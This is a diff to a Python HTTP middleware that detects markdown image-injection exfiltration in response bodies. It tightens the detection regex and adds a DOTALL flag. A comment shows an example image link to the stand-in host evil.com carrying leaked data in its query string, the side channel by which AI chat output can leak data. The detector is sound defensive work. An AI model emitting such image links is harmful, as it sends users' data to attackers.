@@ -17,10 +17,10 @@ class MarkdownExfiltrationDetector(BaseHTTPMiddleware):
             
             # This regex detects the 'Image Injection' side-channel:
             # Matches: ![any_text](http://evil.com/path?leak=data)
-            exfiltration_pattern = r"!\[.*\]\(https?://[^\s)]+\?[^\s)]+=[^\s)]+\)"
+            exfiltration_pattern = r"!\[.*?\]\(https?:\/\/[^\s)]+\?[^\s)]+=[^\s)]+\)"
             
             decoded_body = body.decode(errors="ignore")
-            if re.search(exfiltration_pattern, decoded_body):
+            if re.search(exfiltration_pattern, decoded_body, re.DOTALL):
                 # In a real GSoC project, you'd log this to a security dashboard
                 print("\n🚨 [SECURITY ALERT] Potential Side-Channel Exfiltration Detected!")
                 print(f"🚩 Target Pattern Found in Response Body\n")
